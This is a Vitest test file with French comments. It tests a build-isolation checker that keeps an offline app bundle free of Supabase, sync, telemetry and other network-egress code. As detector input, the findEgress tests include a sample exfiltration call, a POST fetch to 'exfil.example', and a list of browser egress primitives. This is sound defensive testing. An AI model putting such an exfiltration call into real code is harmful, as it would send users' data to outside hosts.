import { describe, expect, it } from 'vitest'

import {
  findEgress,
  findForbiddenModules,
  formatEgressFailure,
  formatIsolationFailure,
  normalizeModuleId,
} from '@/builder/isolation'

const ROOT = '/home/runner/work/pharnos/pharnos/web'

describe('normalizeModuleId', () => {
  it('ramène les séparateurs Windows à des slashs', () => {
    expect(normalizeModuleId('D:\\pharnos-mvp\\web\\src\\lib\\supabase.ts')).toBe(
      'D:/pharnos-mvp/web/src/lib/supabase.ts',
    )
  })

  it('retire le suffixe de requête ajouté par Vite', () => {
    expect(normalizeModuleId(`${ROOT}/src/lib/outbox.ts?used`)).toBe(`${ROOT}/src/lib/outbox.ts`)
  })

  it('retire le préfixe des modules virtuels', () => {
    expect(normalizeModuleId('\0virtual:pwa-register')).toBe('virtual:pwa-register')
  })
})

describe('findForbiddenModules', () => {
  it('laisse passer un artefact autonome', () => {
    const hits = findForbiddenModules([
      `${ROOT}/src/builder/main.tsx`,
      `${ROOT}/src/features/workspace/dossier-repository.ts`,
      `${ROOT}/src/features/workspace/ctd-full-outline.ts`,
      `${ROOT}/src/lib/db.ts`,
      `${ROOT}/src/lib/persist.ts`,
      `${ROOT}/node_modules/dexie/dist/modern/dexie.mjs`,
      `${ROOT}/node_modules/react-dom/client.js`,
    ])
    expect(hits).toEqual([])
  })

  it('refuse le client Supabase, même tiré transitivement', () => {
    const hits = findForbiddenModules([
      `${ROOT}/node_modules/@supabase/supabase-js/dist/module/index.js`,
    ])
    expect(hits).toHaveLength(1)
    expect(hits[0]?.rule.label).toBe('@supabase/*')
  })

  it('refuse les SOUS-CLIENTS Supabase, importables sans le méta-paquet', () => {
    // Constaté en revue : viser `@supabase/supabase-js` seul laissait entrer REST, Storage et
    // Edge Functions au complet, avec un build vert.
    const hits = findForbiddenModules([
      `${ROOT}/node_modules/@supabase/postgrest-js/dist/esm/index.js`,
      `${ROOT}/node_modules/@supabase/storage-js/dist/module/index.js`,
      `${ROOT}/node_modules/@supabase/functions-js/dist/module/FunctionsClient.js`,
      `${ROOT}/node_modules/@supabase/auth-js/dist/module/GoTrueClient.js`,
      `${ROOT}/node_modules/@supabase/realtime-js/dist/module/RealtimeClient.js`,
    ])
    expect(hits).toHaveLength(5)
    expect(new Set(hits.map((h) => h.rule.label))).toEqual(new Set(['@supabase/*']))
  })

  it('refuse TOUT module de synchronisation, y compris un futur', () => {
    const hits = findForbiddenModules([
      `${ROOT}/src/features/workspace/dossier-sync.ts`,
      `${ROOT}/src/features/workspace/dossier-attachments-sync.ts`,
      // Feature qui n'existe pas encore : la règle est écrite sur la CONVENTION, pas sur la liste
      // des fichiers du jour — sinon elle se périme au premier ajout.
      `${ROOT}/src/features/inventaire/stock-sync.ts`,
    ])
    expect(hits).toHaveLength(3)
    expect(new Set(hits.map((h) => h.rule.label))).toEqual(new Set(['*-sync.ts(x)']))
  })

  it('ne confond pas un module de synchronisation avec un module qui en parle', () => {
    // `sync-prefs.ts` est une préférence utilisateur, pas un canal de sortie ; `dossier-sync.test.ts`
    // n'est pas livré. Un faux positif ici casserait un build légitime.
    const hits = findForbiddenModules([
      `${ROOT}/src/lib/sync-prefs.ts`,
      `${ROOT}/src/features/workspace/sync-status.ts`,
    ])
    expect(hits).toEqual([])
  })

  it('refuse la télémétrie sortante', () => {
    const hits = findForbiddenModules([
      `${ROOT}/node_modules/@sentry/react/build/esm/index.js`,
      `${ROOT}/src/lib/sentry.ts`,
    ])
    expect(hits.map((h) => h.rule.label)).toEqual(['@sentry/*', 'src/lib/sentry.ts'])
  })

  it("refuse ce qui appartient à l'offre complète : cycle de vie, relances, correspondance", () => {
    const hits = findForbiddenModules([
      `${ROOT}/src/features/workspace/RoadmapPage.tsx`,
      `${ROOT}/src/features/reminders/RemindersPage.tsx`,
      `${ROOT}/src/features/correspondence/CorrespondenceInboxPage.tsx`,
    ])
    expect(hits).toHaveLength(3)
  })

  it('laisse passer roadmap-data.ts, qui porte les agences et les langues officielles', () => {
    // `agencyFor` / `officialLanguage` servent au MONTAGE du dossier : interdire le fichier de
    // données au motif qu'il s'appelle « roadmap » casserait la réutilisation recherchée.
    const hits = findForbiddenModules([
      `${ROOT}/src/features/workspace/roadmap-data.ts`,
      `${ROOT}/src/features/workspace/module1-tree.ts`,
      `${ROOT}/src/features/workspace/ctd-full-outline.ts`,
    ])
    expect(hits).toEqual([])
  })

  it("refuse l'authentification et la console d'administration", () => {
    const hits = findForbiddenModules([
      `${ROOT}/src/features/auth/AuthProvider.tsx`,
      `${ROOT}/src/features/admin/AdminConsole.tsx`,
    ])
    expect(hits).toHaveLength(2)
  })

  it('refuse la VIDANGE de la file vers le serveur', () => {
    const hits = findForbiddenModules([`${ROOT}/src/lib/flush-outbox.ts`])
    expect(hits).toHaveLength(1)
    expect(hits[0]?.rule.label).toBe('src/lib/flush-outbox.ts')
  })

  it('laisse passer la file elle-même, qui est purement LOCALE', () => {
    // `src/lib/outbox.ts` n'importe que Dexie et ne fait aucun appel réseau — vérifié.
    // L'interdire bloquait `dossier-repository`, `catalogue/repository` et
    // `dossier-attachments-repository`, donc tout le socle que le builder doit RÉUTILISER.
    // Ce qui compte est ce qu'un module FAIT, pas ce que son nom évoque.
    const hits = findForbiddenModules([
      `${ROOT}/src/lib/outbox.ts`,
      `${ROOT}/src/lib/db.ts`,
      `${ROOT}/src/lib/audit.ts`,
      `${ROOT}/src/features/catalogue/repository.ts`,
      `${ROOT}/src/features/workspace/dossier-repository.ts`,
    ])
    expect(hits).toEqual([])
  })
})

describe('findEgress', () => {
  it("laisse passer le code émis d'un artefact conforme", () => {
    // Les seules adresses réellement présentes dans le bundle : espaces de noms XML et liens
    // d'erreur de React. Vérifié sur `dist-builder/assets/*.js`.
    const hits = findEgress([
      {
        file: 'assets/index.js',
        code: 'createElementNS("http://www.w3.org/2000/svg"); throw Error("https://react.dev/errors/418")',
      },
    ])
    expect(hits).toEqual([])
  })

  it('refuse une adresse absolue écrite à la main', () => {
    // Le contrôle de dépendances ne verrait RIEN ici : aucun module interdit n'est importé.
    const hits = findEgress([
      { file: 'assets/index.js', code: 'fetch("https://exfil.example/collecte",{method:"POST"})' },
    ])
    expect(hits).toHaveLength(1)
    expect(hits[0]?.evidence).toBe('https://exfil.example/collecte')
  })

  it('inspecte AUSSI les assets JS, où atterrissent les web workers', () => {
    // Vite compile les workers dans un build imbriqué et les émet en asset : ils n'apparaissent
    // jamais dans `chunk.modules`. Neuf caractères (`?worker`) suffisaient à traverser le verrou.
    const hits = findEgress([
      { file: 'assets/probe.worker-abc.js', code: 'a="https://uhsireqwzqqymgsxuvqh.supabase.co"' },
    ])
    expect(hits).toHaveLength(1)
    expect(hits[0]?.file).toBe('assets/probe.worker-abc.js')
  })

  it('refuse les primitives de sortie, que la minification ne renomme pas', () => {
    const hits = findEgress([
      { file: 'a.js', code: 'navigator.sendBeacon(u,d)' },
      { file: 'b.js', code: 'new WebSocket(u)' },
      { file: 'c.js', code: 'new EventSource(u)' },
      { file: 'd.js', code: 'new XMLHttpRequest()' },
      { file: 'e.js', code: 'importScripts(u)' },
    ])
    expect(hits).toHaveLength(5)
  })
})

describe('formatEgressFailure', () => {
  it('ne répète pas cent fois le même littéral', () => {
    const hits = findEgress([
      { file: 'a.js', code: 'x("https://exfil.example");y("https://exfil.example")' },
    ])
    expect(hits).toHaveLength(2)
    const message = formatEgressFailure(hits)
    expect(message.split('https://exfil.example').length - 1).toBe(1)
    expect(message).toContain('URL_ALLOWLIST')
  })
})

describe('formatIsolationFailure', () => {
  it('nomme le module fautif, la règle et la conduite à tenir', () => {
    const hits = findForbiddenModules([`${ROOT}/src/lib/supabase.ts`])
    const message = formatIsolationFailure(hits)
    expect(message).toContain('src/lib/supabase.ts')
    expect(message).toContain('singleton du client Supabase')
    expect(message).toContain('landing/_headers')
  })
})
